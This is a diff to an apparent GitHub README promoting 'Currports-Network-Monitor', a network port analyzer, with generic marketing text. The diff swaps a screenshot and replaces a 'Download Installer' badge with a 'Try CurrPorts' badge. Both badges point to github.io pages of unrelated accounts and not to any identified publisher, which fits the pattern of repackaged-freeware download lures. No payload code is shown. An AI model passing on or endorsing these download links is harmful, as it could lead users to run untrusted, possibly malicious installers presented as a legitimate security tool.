@@ -21,10 +21,10 @@ As an advanced network port analyzer, the application provides detailed informat
 Whether you are debugging a network application or simply auditing your system's security, Currports-Network-Monitor offers the precision and performance required for high-stakes environments. It is an indispensable part of any professional's toolkit for maintaining network integrity and system transparency.
 
 <div align="center">
-  <img src="https://ida-freewares.ru/images/stories/TechTips/kak-uznat-kakie-programmy-podklyucheny-k-internetu-currports/currports.png" alt="Program Interface Screenshot"/>
+  <img src="https://www.ghacks.net/wp-content/uploads/2010/08/currport-internet-connections.png" alt="Program Interface Screenshot"/>
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://reubenhillsenp.github.io/.github/Currports-Network-Monitor)
+[![Try CurrPorts](https://img.shields.io/badge/Try-CurrPorts-D97706?style=for-the-badge)](https://workrave-timer.github.io/.github/)
 
 ---
 
